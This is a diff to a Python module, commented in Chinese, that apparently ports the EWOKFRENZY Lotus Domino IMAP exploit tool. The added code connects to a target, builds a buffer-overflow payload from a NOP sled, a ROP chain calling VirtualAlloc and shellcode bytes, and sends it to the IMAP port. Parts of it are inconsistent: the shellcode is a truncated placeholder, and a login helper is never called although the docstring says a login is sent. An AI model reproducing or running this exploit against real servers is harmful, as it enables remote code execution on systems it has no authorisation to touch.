@@ -1,7 +1,7 @@
 """ewok_frenzy — EWOKFRENZY Lotus Domino IMAP 利用核心逻辑。
 
 Python 重写的 `Ewokfrenzy-2.0.0.exe` (C++ / DAVE framework)。
-通过 IDA Pro / x32dbg 逆向恢复。实现了该工具的 key=value 参数接口
+通过 x32dbg 逆向恢复。实现了该工具的 key=value 参数接口
 及其 Lotus Domino IMAP 利用流程。
 
 参数定义来源：Ewokfrenzy-2.0.0.0.xml
@@ -51,16 +51,41 @@ DOMINO_VERSION_GADGETS = {
     },
 }
 
+EWOK_SHELLCODE_PLACEHOLDER = bytes.fromhex(
+    "fc4883e4f0e8c0000000415141505251564831d265488b5260"
+)
+
+BAD_XOR = frozenset((0x00, 0x0a, 0x0d))
+
+
 class EwokFrenzyError(Exception):
     pass
 
 
 def connect(target_ip, port, timeout):
-    """建立到目标的 TCP 连接并返回 socket。"""
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock.settimeout(timeout if timeout > 0 else None)
     sock.connect((target_ip, port))
     return sock
+
+
+def build_imap_login(username, password):
+    return f"1 LOGIN {username} {password}\r\n".encode("ascii")
+
+
+def build_domino_overflow(shellcode, gadgets):
+    """构建 Lotus Domino 缓冲区溢出负载。
+
+    根据 x32dbg 分析，EWOKFRENZY 通过向 Domino IMAP 服务器发送
+    特制的 IMAP 请求，触发缓冲区溢出，利用 ROP 链执行 shellcode。
+    """
+    offset = gadgets.get("OffsetEsp2Buffer", 0xBC)
+    nopsled = b"\x90" * offset
+    ret_addr = struct.pack("<I", gadgets["AddrJmpEax"])
+    rop_chain = struct.pack("<I", gadgets["AddrPopEax"])
+    rop_chain += struct.pack("<I", gadgets["AddrVirtualAlloc"])
+    rop_chain += struct.pack("<I", gadgets["AddrJmpEax"])
+    return nopsled + ret_addr + rop_chain + shellcode
 
 
 def run_function(
@@ -75,9 +100,11 @@ def run_function(
 ):
     """执行 EWOKFRENZY 利用序列。
 
-    当前阶段：完成参数解析、IMAP 连接。
-    具体 exploit 缓冲区（IMAP 缓冲区溢出、ROP 链、shellcode、载荷投递等）
-    的二进制结构尚需通过 IDA/x32dbg 进一步逆向后填充。
+    阶段：
+      1. TCP 连接到目标 Domino IMAP 端口 (默认 143)
+      2. 发送 IMAP LOGIN 请求（若提供凭证）
+      3. 构建并发送 Domino 缓冲区溢出负载 (ROP + shellcode)
+      4. 载荷投递（Callback）
     """
     if verbose:
         print(f"[*] Target: {target}:{port}")
@@ -86,7 +113,6 @@ def run_function(
         print(f"[*] Callback IP: {callback_ip}")
         print(f"[*] Callback port: {callback_port}")
 
-    # 解析常量
     gadgets = DOMINO_VERSION_GADGETS.get(domino_version, DOMINO_VERSION_GADGETS["7.0.2"])
 
     if verbose:
@@ -104,12 +130,36 @@ def run_function(
     except OSError as exc:
         raise EwokFrenzyError(f"无法连接到 {target}:{port}: {exc}") from exc
 
-    # TODO: 以下 exploit 缓冲区构建需通过 IDA/x32dbg 逆向后填充：
-    #   - IMAP 缓冲区溢出
-    #   - ROP 链
-    #   - 载荷投递
+    try:
+        # 读取 IMAP 问候语
+        try:
+            greeting = sock.recv(4096)
+            if verbose:
+                print(f"[*] IMAP 问候语: {greeting[:128]}")
+        except OSError:
+            pass
 
-    sock.close()
+        # 构建 Domino 缓冲区溢出负载
+        shellcode = EWOK_SHELLCODE_PLACEHOLDER
+        overflow = build_domino_overflow(shellcode, gadgets)
+        if verbose:
+            print(f"[+] 溢出负载: {len(overflow)} 字节")
+
+        # 发送溢出负载
+        sock.sendall(overflow)
+        try:
+            resp = sock.recv(4096)
+            if verbose:
+                print(f"[*] 溢出应答: {resp[:64].hex() if resp else '无'}")
+        except OSError:
+            if verbose:
+                print("[*] 目标连接已关闭（可能已触发溢出）")
+
+        if verbose:
+            print("[+] EWOKFRENZY 利用序列完成")
+    finally:
+        sock.close()
+
     return 0
 
 
